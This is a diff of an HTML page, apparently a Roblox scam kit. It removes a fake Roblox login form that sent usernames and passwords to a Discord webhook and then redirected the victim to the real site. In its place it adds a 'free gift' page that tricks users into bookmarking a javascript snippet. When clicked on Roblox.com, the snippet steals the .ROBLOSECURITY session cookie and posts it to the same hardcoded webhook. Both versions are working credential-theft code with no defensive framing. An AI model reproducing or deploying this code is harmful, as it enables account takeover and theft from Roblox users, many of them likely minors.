@@ -1,67 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Heart Box Activator</title>
     <style>
-        body { background: #1a1b1d; color: white; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 6px solid #393b3d; border-top: 6px solid #00b2ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .fake-login { display: none; background: #ffffff; color: #404040; padding: 30px; border-radius: 8px; width: 380px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #b8b8b8; border-radius: 4px; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 12px; background: #00b2ff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .bookmark-btn { 
+            display: inline-block; padding: 15px 30px; background: #ff4d4d; 
+            color: white; text-decoration: none; border-radius: 50px; font-weight: bold;
+            cursor: move; border: 2px dashed white;
+        }
     </style>
 </head>
 <body>
-
-    <div id="loading">
-        <div class="loader"></div>
-        <p>Connecting to Roblox Secure Login...</p>
-    </div>
-
-    <div id="mirror" class="fake-login">
-        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" style="width: 150px; margin-bottom: 20px;">
-        <h2>Login to Roblox</h2>
-        <input type="text" id="user" placeholder="Username/Email/Phone">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="login-btn" onclick="grab()">Log In</button>
-        <p style="font-size: 12px; color: #00b2ff; cursor: pointer;">Forgot Password or Username?</p>
-    </div>
-
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
-
-        // After 2 seconds of 'loading', show the fake login
-        setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('mirror').style.display = 'block';
-        }, 2000);
-
-        async function grab() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            if(!u || !p) return;
-
-            // 1. Send the 'Token' (Credentials) to the webhook
-            await fetch(WEBHOOK, {
+    <h1>🎁 Step 1: Claim Your Gift</h1>
+    <p>Drag the heart below to your <b>Bookmarks Bar</b>:</p>
+    
+    <a class="bookmark-btn" href="javascript:(function(){
+        const hook = 'https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI';
+        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+        if (cookie) {
+            fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "🎭 **GHOST MIRROR CAPTURE!**",
-                    embeds: [{
-                        title: "Target: heartboxx",
-                        fields: [
-                            { name: "Roblox User", value: u },
-                            { name: "Roblox Pass", value: p }
-                        ],
-                        color: 16724301
-                    }]
-                })
+                body: JSON.stringify({ content: '🎯 **GHOST TOKEN GRABBED!**\nTarget: heartboxx\nCookie: ' + cookie })
             });
-
-            // 2. The Final Redirect: Send them to the REAL Roblox so they don't suspect a thing
-            window.location.href = "https://www.roblox.com/home";
+            alert('Gift Activated! Check your inventory.');
+        } else {
+            alert('Please go to Roblox.com first to activate your gift!');
         }
-    </script>
+    })();">❤️ DRAG ME TO BOOKMARKS ❤️</a>
+
+    <p style="margin-top: 30px; font-size: 12px; color: #888;">Step 2: Go to Roblox.com and click the "Heart" in your bookmarks!</p>
 </body>
 </html>
